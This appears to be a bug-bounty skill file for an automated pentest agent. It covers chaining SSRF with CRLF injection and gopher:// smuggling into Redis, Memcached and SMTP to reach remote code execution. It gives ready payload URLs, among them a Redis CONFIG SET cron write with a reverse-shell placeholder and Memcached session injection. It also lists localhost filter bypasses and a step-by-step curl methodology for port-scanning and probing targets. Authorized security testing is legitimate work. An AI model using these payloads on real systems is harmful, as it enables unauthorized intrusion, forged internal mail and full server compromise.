---
name: ssrf-protocol-smuggling-chain
pattern: SSRF Protocol Smuggling to RCE Chains
description: "Chain SSRF with CRLF injection to smuggle commands into Redis/Memcached/SMTP via gopher:// or URL path injection, escalating to RCE through cache deserialization or cron write"
triggers: ["/test-ssrf", "protocol smuggling", "gopher ssrf", "crlf ssrf", "redis ssrf rce", "memcached ssrf", "ssrf deserialization", "ssrf crlf chain"]
tech: [generic, java, php, python]
severity: Critical
related_patterns: [ssrf-to-rce-chain, ssrf-redirect-loop-exfil, crlf-header-injection, deserialization-gadgets, auto-chain-discovery, nextjs-ssrf]
sources: ["Orange Tsai — GitHub Enterprise 4-bug chain (2017)", "HackerOne #200542 ($12", "500)", "Wallarm SSRF Bible", "Chaitin Tech — Gopher attack surfaces"]
---

# SSRF Protocol Smuggling to RCE Chains

**Source:** Orange Tsai (GitHub Enterprise, 2017), general research
**CVEs:** HackerOne #200542 ($12,500)
**Severity:** CRITICAL
**Affected:** Any application with SSRF + internal services using text-based protocols

## Crown Jewel Targets

- **Redis (port 6379)** — CRLF + SET command to write cron job or SSH authorized_keys for RCE
- **Memcached (port 11211)** — inject serialized session payload for deserialization RCE (Rails Marshal, PHP unserialize, Java readObject)
- **Internal SMTP (port 25)** — forge emails from trusted internal mail server for phishing
- **Rails + Memcached session store** — Ruby Marshal deserialization via DeprecatedInstanceVariableProxy gadget
- **PHP + Memcached** — POP chain injection (Monolog, Guzzle, Laravel) for code execution
- **Python 2 backends** — httplib CRLF vulnerability enables protocol smuggling without gopher://

## Attack Surface Signals

- SSRF confirmed reaching localhost or internal network
- `gopher://` protocol accepted in URL parameters (full TCP stream control)
- Python 2 backend (vulnerable httplib without CRLF sanitization)
- Applications using Redis/Memcached for session storage
- Internal services on ports 6379, 11211, 25, 5432, 3306, 9200
- Error messages revealing Python/Ruby/PHP/Java backend language
- Webhook features, URL preview endpoints, any `url=` parameter

## Overview

Chain low-severity SSRF vulnerabilities through internal services combined with CRLF injection for protocol smuggling. This converts a seemingly harmless blind SSRF into full remote code execution by speaking native protocols (Redis, Memcached, SMTP) through HTTP request smuggling into internal service ports.

## Technical Details

### GitHub Enterprise 4-Bug Chain (Orange Tsai, 2017)

A masterclass in chaining Low-severity bugs into Critical RCE:

**Bug 1 -- SSRF via WebHook:**
GitHub Enterprise allows WebHook URLs. The IP blacklist blocks `127.0.0.1` and `localhost` but not `http://0/` (RFC 3986 allows `0` as shorthand for `0.0.0.0` which resolves to localhost on many systems). This provides POST-based SSRF to localhost.

**Bug 2 -- POST-to-GET SSRF pivot via Graphite:**
The internal Graphite service (port 8000) has a `send_email` endpoint that takes a `url` parameter and makes a GET request to fetch the email content. Chain: POST SSRF to Graphite `send_email` → GET SSRF to any internal URL.

**Bug 3 -- CRLF injection for Memcached protocol smuggling:**
Python 2's `httplib` (used by Graphite) does not sanitize `\r\n` in URL paths. Injecting CRLF characters into the URL lets you write arbitrary bytes to the TCP connection. Against Memcached (port 11211), this lets you inject `set` commands:

```
http://0:11211/%0D%0Aset%20github_rails%3Asession%3A%20...%20VALUE%0D%0A
```

This writes a serialized Ruby object into the Memcached session store.

**Bug 4 -- Ruby Marshal deserialization RCE:**
Rails loads sessions from Memcached via `Marshal.load`. The injected cache entry contains a malicious `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` object wrapping an `ERB` template that executes arbitrary commands when deserialized.

```
SSRF (http://0/) → Graphite send_email (POST→GET pivot) →
CRLF injection in URL → Memcached SET command →
Ruby Marshal payload in session cache → Rails deserializes → RCE
```

### Localhost Bypass Techniques

```
http://0/                 # RFC 3986: 0 = 0.0.0.0
http://[::]/              # IPv6 loopback
http://127.0.0.1.nip.io/ # DNS resolves to 127.0.0.1
http://0177.0.0.1/       # Octal
http://2130706433/        # Decimal (127*2^24 + 1)
http://0x7f000001/        # Hex
```

DNS rebinding: Domain alternating attacker IP / `127.0.0.1` with short TTL bypasses IP filter on second lookup.

### Protocol Smuggling Targets

**Redis (port 6379):**
Redis accepts commands one per line, ignores lines it cannot parse (making it tolerant of HTTP headers). Via CRLF:
```
http://0:6379/%0D%0ASET%20evil%20%22payload%22%0D%0A
http://0:6379/%0D%0ACONFIG%20SET%20dir%20/var/spool/cron/%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASET%20cron%20%22...reverse-shell...%22%0D%0ASAVE%0D%0A
```
RCE via: cron file write, authorized_keys write, or module load.

**Memcached (port 11211):**
Text protocol, `set key flags exptime bytes\r\nvalue\r\n`:
```
http://0:11211/%0D%0Aset%20session_key%200%203600%20LEN%0D%0ASERIALIZED_PAYLOAD%0D%0A
```
RCE via: session deserialization (Rails Marshal, PHP unserialize, Java readObject).

**SMTP (port 25):** CRLF injects email headers/body. Use for phishing from trusted internal SMTP.

**Gopher (gopher://):** Full TCP stream control -- the most powerful SSRF primitive:
```
gopher://127.0.0.1:6379/_SET%20key%20value%0D%0AQUIT
```

**LDAP/JNDI:** Chain `ldap://127.0.0.1:389/` into JNDI injection on Java backends.

### Cache Poisoning RCE Patterns

When internal cache services are reachable via SSRF + protocol smuggling:

| Cache | Serialization | Gadget |
|-------|--------------|--------|
| Rails + Memcached | Ruby Marshal | `DeprecatedInstanceVariableProxy` + `ERB` |
| PHP + Memcached | PHP serialize | POP chain (Monolog, Guzzle, Laravel) |
| Java + Redis | Java Serialization | Commons Collections, Spring, Groovy |
| Python + Redis | Pickle | `__reduce__` for arbitrary code |

### Amazon/Nuxeo Semicolon Path Confusion (CVE-2010-1871)

Different pattern, same spirit -- path parsing differentials enable deep chains:

1. Semicolon in URL path (`/path;param=value`) interpreted differently by proxy vs app
2. JBoss Seam `actionMethod` parameter with double EL evaluation
3. EL injection blacklist bypassed via bracket notation: `${"".getClass()}` instead of `${Runtime}`
4. Chain: Path confusion → reach Seam framework → double EL evaluation → RCE

## Detection Indicators

- SSRF in any form (webhooks, URL previews, PDF generators, image fetchers, proxy endpoints)
- URL parameters accepting `http://`, `gopher://`, or other protocol schemes
- Internal error messages revealing internal hostnames or ports
- Response time differences when targeting internal ports (port open vs closed)
- Python 2 backend (vulnerable httplib without CRLF sanitization)
- Applications using Memcached/Redis for session storage

## Testing Methodology

### Step 1: Find and Confirm SSRF

```bash
# Mint the OOB callback host: mcp__Burp__generate_collaborator_payload
# (or oob_new). Poll it with mcp__Burp__get_collaborator_interactions
# (or oob_check). No interactsh-client ships in this image.

# Test URL-accepting parameters
curl "TARGET/api/webhook?url=https://PAYLOAD_HOST"
curl "TARGET/api/preview?url=https://PAYLOAD_HOST"
```

### Step 2: Test Localhost Bypass

```bash
# Try each bypass against the SSRF
for ip in "0" "0.0.0.0" "[::1]" "127.1" "2130706433" "0x7f000001" "0177.0.0.1" "127.0.0.1.nip.io"; do
  curl "TARGET/api/webhook?url=http://$ip/"
done
```

### Step 3: Map Internal Services and Test CRLF

```bash
# Port scan via SSRF (6379=Redis, 11211=Memcached, 25=SMTP, 5432=PG, 3306=MySQL, 9200=ES)
for port in 6379 11211 25 5432 3306 9200 8500 2375; do
  curl "TARGET/api/webhook?url=http://0:$port/"
done

# Test CRLF injection (URL-encoded and double-encoded)
curl "TARGET/api/webhook?url=http://0:11211/%0D%0Astats%0D%0A"

# Protocol smuggling PoC: Memcached set + Redis set
curl "TARGET/api/webhook?url=http://0:11211/%0D%0Aset%20ssrf_test%200%2060%205%0D%0Ahello%0D%0A"
curl "TARGET/api/webhook?url=http://0:6379/%0D%0ASET%20ssrf_test%20confirmed%0D%0A"
```

### Step 4: Deserialization in Cache Layer

Identify serialization format for cache values. Generate gadgets: ysoserial (Java), phpggc (PHP), custom for Ruby Marshal/Python Pickle.

## Bug Bounty Relevance

- **Severity**: CRITICAL. This chain pattern converts Low SSRF into Critical RCE.
- **Where to look**: Webhook features, URL preview/unfurl, PDF generators, image proxy, any `url=` parameter.
- **Key insight**: Even blind, POST-only, limited SSRF can be chained to RCE if internal services are reachable.
- **Report strategy**: Report the full chain. Even if you cannot complete RCE, demonstrate SSRF + internal service interaction + CRLF for High severity.
- **Duplicate avoidance**: The chain is novel enough that each link (SSRF, CRLF, protocol smuggling, deserialization) makes the report unique.

## Reference Writeups

- [How I Chained 4 Vulnerabilities on GitHub Enterprise to RCE](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html) by Orange Tsai
- [SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/) by Wallarm
- [A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) by Orange Tsai
- [Gopher Protocol in SSRF](https://blog.chaitin.cn/gopher-attack-surfaces/) by Chaitin Tech

---

## Operator Notes (Battle-Tested)

- **Test gopher:// support first** — if the SSRF endpoint accepts `gopher://`, you have full TCP stream control. Skip CRLF injection entirely
- **Python 2 backends are goldmines** — httplib in Python 2 does NOT sanitize CRLF in URL paths. Check for Python 2 indicators (error pages, headers)
- **Redis is the easiest RCE path** — Redis ignores lines it can't parse (HTTP headers), making it tolerant of smuggled commands. Always test Redis first
- **Identify session store technology** — if app uses Memcached/Redis for sessions, the deserialization gadget chain is your RCE vector. Check framework (Rails=Marshal, PHP=unserialize, Java=readObject)
- **Orange Tsai's chain is the blueprint** — study the GitHub Enterprise 4-bug chain thoroughly. Every link (SSRF + POST-to-GET pivot + CRLF + deserialization) appears in real-world targets
- **Double/triple URL-encode CRLF** — proxy chains may decode once before passing to backend. Test `%250d%250a` and `%25250d%25250a`
- **Report partial chain as HIGH** — SSRF + confirmed internal service interaction = HIGH even without completing RCE. Demonstrate the risk clearly

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| SSRF confirmed, mapping internal services | `ssrf-to-rce-chain` |
| Blind SSRF, need response body | `ssrf-redirect-loop-exfil` |
| CRLF injection on HTTP responses | `crlf-header-injection` |
| Deserialization gadget needed | `deserialization-gadgets` |
| Next.js middleware as SSRF vector | `nextjs-ssrf` |
| Chain escalation matrix | `auto-chain-discovery` |
